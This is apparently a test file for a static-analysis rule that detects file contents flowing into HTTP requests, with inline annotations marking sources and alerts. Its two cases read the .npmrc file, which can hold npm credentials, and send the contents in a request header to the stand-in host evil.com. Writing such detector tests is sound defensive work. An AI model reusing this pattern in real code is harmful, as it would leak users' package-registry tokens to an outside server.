var fs = require("fs"),
    https = require("https");

var content = fs.readFileSync(".npmrc", "utf8"); // $ Source[js/file-access-to-http]
https.get({
  hostname: "evil.com",
  path: "/upload",
  method: "GET",
  headers: { Referer: content }
}, () => { }); // $ Alert[js/file-access-to-http]

const fsp = require("fs").promises;

(async function sendRequest() {
  try {
    const content = await fsp.readFile(".npmrc", "utf8"); // $ Source[js/file-access-to-http]

    https.get({
      hostname: "evil.com",
      path: "/upload",
      method: "GET",
      headers: { Referer: content }
    }, () => { }); // $ Alert[js/file-access-to-http]

  } catch (error) {
    console.error("Error reading file:", error);
  }
})();
